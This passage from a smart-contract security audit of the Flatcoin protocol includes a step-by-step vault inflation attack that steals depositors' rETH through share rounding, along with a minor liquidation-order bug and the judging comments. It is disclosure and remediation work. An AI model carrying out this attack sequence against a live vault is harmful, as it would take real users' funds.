@nevillehuang , this is a good find imo but since we are going to be the first depositors as well as creators of leverage positions as part of protocol initialisation I wouldn't believe this is something we  are concerned about. Furthermore, the points have no monetary value (at least not something we are going to assign) and there are costs associated with doing looping (keeper fees, possible losses due to price volatility etc.). Cc @itsermin @D-Ig .

**nevillehuang**

@rashtrakoff I will be maintaining as medium severity, even though points currently do not hold value, I believe it is not intended to allow free minting of points freely given it will hold some form of incentives in the future, so I believe it breaks core contract functionality. From my understanding, being the first depositor is only given as an example and is not required as shown in other issues such as #44 and #141.

# Issue M-9: Vault Inflation Attack 

Source: https://github.com/sherlock-audit/2023-12-flatmoney-judging/issues/190 

## Found by 
santipu\_, xiaoming90
## Summary

Malicious users can perform an inflation attack against the vault to steal the assets of the victim.

## Vulnerability Detail

A malicious user can perform a donation to execute a classic first depositor/ERC4626 inflation Attack against the FlatCoin vault. The general process of this attack is well-known, and a detailed explanation of this attack can be found in many of the resources such as the following:

- https://blog.openzeppelin.com/a-novel-defense-against-erc4626-inflation-attacks
- https://mixbytes.io/blog/overview-of-the-inflation-attack

In short, to kick-start the attack, the malicious user will often usually mint the smallest possible amount of shares (e.g., 1 wei) and then donate significant assets to the vault to inflate the number of assets per share. Subsequently, it will cause a rounding error when other users deposit.

However, in Flatcoin, there are various safeguards in place to mitigate this attack. Thus, one would need to perform additional steps to workaround/bypass the existing controls.

Let's divide the setup of the attack into two main parts:

1. Malicious user mint 1 mint of share
2. Donate or transfer assets to the vault to inflate the assets per share

#### Part 1 - Malicious user mint 1 mint of share

Users could attempt to mint 1 wei of share. However, the validation check at Line 79 will revert as the share minted is less than `MIN_LIQUIDITY` = 10_000. However, this minimum liquidation requirement check can be bypassed.

https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/StableModule.sol#L61

```solidity
File: StableModule.sol
61:     function executeDeposit(
62:         address _account,
63:         uint64 _executableAtTime,
64:         FlatcoinStructs.AnnouncedStableDeposit calldata _announcedDeposit
65:     ) external whenNotPaused onlyAuthorizedModule returns (uint256 _liquidityMinted) {
66:         uint256 depositAmount = _announcedDeposit.depositAmount;
67: 
68:         uint32 maxAge = _getMaxAge(_executableAtTime);
69: 
70:         _liquidityMinted = (depositAmount * (10 ** decimals())) / stableCollateralPerShare(maxAge);
71: 
72:         if (_liquidityMinted < _announcedDeposit.minAmountOut)
73:             revert FlatcoinErrors.HighSlippage(_liquidityMinted, _announcedDeposit.minAmountOut);
74: 
75:         _mint(_account, _liquidityMinted);
76: 
77:         vault.updateStableCollateralTotal(int256(depositAmount));
78: 
79:         if (totalSupply() < MIN_LIQUIDITY) // @audit-info MIN_LIQUIDITY = 10_000
80:             revert FlatcoinErrors.AmountTooSmall({amount: totalSupply(), minAmount: MIN_LIQUIDITY});
```

First, Bob mints 10000 wei shares via `executeDeposit` function. Next, Bob withdraws 9999 wei shares via the `executeWithdraw`. In the end, Bob successfully owned only 1 wei share, which is the prerequisite for this attack.

#### Part 2 - Donate or transfer assets to the vault to inflate the assets per share

The vault tracks the number of collateral within the state variables. Thus, simply transferring rETH collateral to the vault directly will not work, and the assets per share will remain the same.

To work around this, Bob creates a large number of accounts (with different wallet addresses). He could choose any or both of the following methods to indirectly transfer collateral to the LP pool/vault to inflate the assets per share:

1) Open a large number of leveraged long positions with the intention of incurring large amounts of losses. The long positions' losses are the gains of the LPs, and the collateral per share will increase.
2) Open a large number of leveraged long positions till the max skew of 120%. Thus, this will cause the funding rate to increase, and the long will have to pay the LPs, which will also increase the collateral per share.

#### Triggering rounding error

The `stableCollateralPerShare` will be inflated at this point. Following is the formula used to determine the number of shares minted to the depositor.

If the `depositAmount` by the victim is not sufficiently large enough, the amount of shares minted to the depositor will round down to zero.

```solidity
_collateralPerShare = (stableBalance * (10 ** decimals())) / totalSupply;
_liquidityMinted = (depositAmount * (10 ** decimals())) / _collateralPerShare
```

Finally, the attacker withdraws their share from the pool. Since they are the only ones with any shares, this withdrawal equals the balance of the vault. This means the attacker also withdraws the tokens deposited by the victim earlier.

## Impact

Malicous users could steal the assets of the victim.

## Code Snippet

https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/StableModule.sol#L61

## Tool used

Manual Review

## Recommendation

A `MIN_LIQUIDITY` amount of shares needs to exist within the vault to guard against a common inflation attack.

However, the current approach of only checking if the `totalSupply() < MIN_LIQUIDITY` is not sufficient, and could be bypassed by making use of the withdraw function.

A more robust approach to ensuring that there is always a minimum number of shares to guard against inflation attack is to mint a certain amount of shares to zero address (dead address) during contract deployment (similar to what has been implemented in Uniswap V2). 



## Discussion

**sherlock-admin**

2 comment(s) were left on this issue during the judging contest.

**ubl4nk** commented:
> invalid or Low-Impact -> Bob can't deposit 10_000 wei and withdraw 9_999, because there are delayed-orders (orders become pending), there are no sorted orders and keepers can select to execute which orders first

**takarez** commented:
>  invalid



# Issue M-10: Announced orders of a position are not deleted when liquidation happens 

Source: https://github.com/sherlock-audit/2023-12-flatmoney-judging/issues/287 

## Found by 
juan
## Summary
Announced orders of a position are not deleted when liquidation happens

## Vulnerability Detail
When a position is liquidated, an existing announced order for that position is not deleted. This means that the user's order can still be executed after liquidation of the position. This is only an issue for leverageAdjut orders, and only if the points module is removed (and this has been said to be a temporary feature by the devs, so the points module is likely to be removed in the future).

## Impact
Once the points module is removed, a user's leverageAdjust order with positive `additionalSizeAdjustment` will still execute after the position has been liquidated.

## Code Snippet
https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/LeverageModule.sol#L147

## Tool used
Manual Review

## Recommendation
Delete announced orders of a position when the position is liquidated



## Discussion

**sherlock-admin**

2 comment(s) were left on this issue during the judging contest.

**takarez** commented:
>  invalid

**takarez** commented:
>  valid: high(10)



